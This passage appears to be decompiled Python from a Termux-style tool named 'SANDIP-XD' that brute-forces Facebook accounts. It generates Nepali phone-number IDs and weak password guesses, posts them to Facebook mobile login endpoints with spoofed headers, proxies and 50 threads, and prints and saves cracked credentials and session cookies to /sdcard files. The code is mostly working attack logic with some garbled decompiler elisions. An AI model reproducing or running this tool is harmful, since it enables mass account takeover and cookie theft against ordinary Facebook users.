...
os.system("xdg-open https://www.facebook.com/sandipghotaneygurung")
...
try:
	...
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;92m \x1b[1;96m[SANDIP-XD')
...
/____/\__,_/_/ /_/\__,_/_/ .___/\___/\__, /  
                        /_/         /____/\033[1;36m0.0.1 \033[1;37m 
"""  )
...
def menu():
	...
	_SANDIP_(f'\033[1;92m[\033[1;34m1\033[1;92m] FILE CLONE')
	_SANDIP_(f'\033[1;92m[\033[1;92m\033[1;34m2\033[1;92m] RANDOM CLONE')
	_SANDIP_(f'\033[1;92m[\033[1;92m\033[1;34m3\033[1;92m] EMAIL CLONE')
	_SANDIP_(f'[\033[1;92m\033[1;34m4\033[1;92m] CONTACT ME')
	_SANDIP_(f'\033[1;92m[\033[1;34m0\033[1;92m]\033[0;91m EXIT')
	_____SANDIP_____ = input('\033[1;92m[\033[1;34m🙂\033[1;92m]\033[0;92mCHOOSE :\x1b[1;92m ')
	if _____SANDIP_____ in ['1']:
		C1()
	if _____SANDIP_____ in ['2']:
		Y2()
	if _____SANDIP_____ in ['3']:
		BER()
	if _____SANDIP_____ in ['4']:
		os.system("xdg-open https://www.facebook.com/sand1pey")
	if _____SANDIP_____ in ['0']:
		exit()
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [Sandipeyy] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"notivate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.8,en;q=0.7"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"notivate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print('\033[1;91m[Sandipeyy-cp]\033[1;93m'+idf+' | '+pw+'\033[1;94m'+tahunng(idf))
				#open('/sdcard/'+Sandipeyy-file clone,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			    ...
			    #print ()
				print(f'\r\x1b[1;92m [\033[1;92mSandipeyy-okK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'\033[1;94m'+tahunng(idf))
				print('\r\x1b[1;96m [\033[1;93mCookie\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
...
def Y2():
    ...
    print('\033[1;96m[NP CODE] \033[1;92m> \033[1;92m 9862 - 9806 - 9881 - 9801')
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as SANDIP:
        clear()
        tl = str(len(user))      
        ...
        print(f"\033[1;92m---------------------------------------------------------")
        for love in user:
            pwv = [love,love[2:],love[1:],code+love,code+love[:3],'nepal','Nepal','Nepal123','freefire']
            uid = code+love
            SANDIP.submit(SANDIP,uid,pwv,tl)
...
def BER():
    ...
    with ThreadPool(max_workers=50) as yaari:
        ...
        for guru in user:
            ...
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+'@@',kode+'##',kode+'hasan',kode+'1122',kode+'1988',kode+guru,kodex+'123',kodex+'1234',kodex+'12345','Nepal','Nepali123']
...
def rcerek(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'sec-ch-ua': '"(Not(A:Brand";v="8", "Chromium";v="111", "Opera";v="111"',
            'sec-ch-ua-mobile': '?1',
        	...
        	if 'c_user' in log_cookies:
        	    ...
        	    cid = coki[151:166]
        	    print ('')
        	    print('\033[1;92m[\033[1;92mSandipeyy-ok\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
        	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
        	    cek_apk(session,coki)
        	    open('/sdcard/SANDIPEYY-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
        	    oks.append(uid)
        	    break 
        	elif 'checkpoint' in log_cookies:
        	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
        	    cid = coki[141:156]
        	    print('\033[1;91m[Sandipeyy-cp]\033[1;93m'+uid+' | '+ps+'\033[1;94m'+tahunng(uid))
              #  print ('\033[1;32m[‎😔]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                #cek_apk(session,coki)
        	    open('/sdcard/SANDIPEYY-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
        	    cps.append(uid)
        	    break          
        	else:
        	    continue
        loop+=1
        sys.stdout.write('\r%s[Sandipeyy]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
